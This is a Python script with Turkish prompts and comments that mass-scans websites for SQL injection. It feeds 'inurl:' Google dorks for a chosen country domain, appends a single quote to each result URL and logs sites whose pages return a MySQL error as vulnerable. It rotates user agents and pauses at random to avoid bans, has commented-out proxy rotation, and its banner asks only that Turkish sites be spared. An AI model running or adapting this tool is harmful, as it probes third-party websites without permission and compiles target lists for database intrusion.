from bs4 import BeautifulSoup
from googlesearch import search # google paketinden çekildi
import requests
import requests_random_user_agent
import random
from lxml.html import fromstring
from itertools import cycle
import traceback
import time

 # Proxy değiştirme yakında..
def get_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            #Grabbing IP and corresponding PORT
            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies

    # Dorkları inurl'li forma getirir.
def dorks2links():
    f = open('dorks.txt','r')
    fDorks = open('dorksFinal.txt','w')

    for i in f:
        inurl = "inurl: "
        i = i[0:-1]
        out = inurl + "{}".format(i) + "\n"
        fDorks.write(out)

    f.close()
    fDorks.close()

def main():
    print("***********************************************************************************")
    print("-----  Quality38 tarafından kodlanmıştır.\n-----  Türk siteleri için kullanımamanız önemle rica olunur..")
    print("***********************************************************************************")
    print()

    dorks2links()
    uzanti = input("Kontrol etmek  istediğiniz sitelerin uzantısını giriniz (com, co.uk, de, net...): ")
    print()
    linkSay = int(input("Her dork için kontrol etmek istediğiniz link sayısını giriniz: "))
    searchLink(uzanti,linkSay)

def searchLink(uzanti,linkSay):

    fDorks = open('dorksFinal.txt','r')
    vulFile = open('vulnerabilityLinks.txt','a')
    print("Tarama işlemi başladı...\n ")



    for dork in fDorks:  #search(query, tld='com', lang='en', num=10, start=0, stop=None, pause=2.0)
        pauseRandom = random.uniform(2,4) # Ban yememek için 2-4 arasında random pause alıyoruz.
        time.sleep(2)
        for i in search(dork, tld=uzanti, lang='en',num=linkSay, start=0, stop=linkSay, pause=pauseRandom):
            time.sleep(2)
            url = i + "'"
            print("{} için kontrol ediliyor...\n".format(url))

            s = requests.Session()
            userAgent = s.headers['User-Agent']

            # proxies = get_proxies()
            # proxy_pool = cycle(proxies)
            #
            # url = 'https://httpbin.org/ip'
            # for i in range(1, 11):
            #     # Get a proxy from the pool
            #     proxy = next(proxy_pool)
            #     print("İstek #%d" % i)
            #     try:
            #         resp = requests.get(url, proxies={"http": proxy, "https": proxy},headers = {'User-agent': '{}'.format(userAgent)})
            #
            #     except:
            #         # Most free proxies will often get connection errors. You will have retry the entire request using another proxy to work.
            #         # We will just skip retries as its beyond the scope of this tutorial and we are only downloading a single url
            #         print("Bağlantı hatası. Proxy değiştiriliyor...\n")

            resp = requests.get(url,headers={'User-agent': '{}'.format(userAgent)})
            page = resp.content
            soup = BeautifulSoup(page, 'html.parser')
            text = soup.find_all(text=True)

            for k in text:
                if k.find("You have an error in your SQL") != -1:
                    vulFile.write(i+"\n")
                    print(" @ Zayifetli olma olasılığı olan site bulundu: ",i)
    vulFile.close()
    print("\nZafiyetli olabilecek siteler vulnerabilityLinks.txt adlı dosyaya kaydedildi.")
main()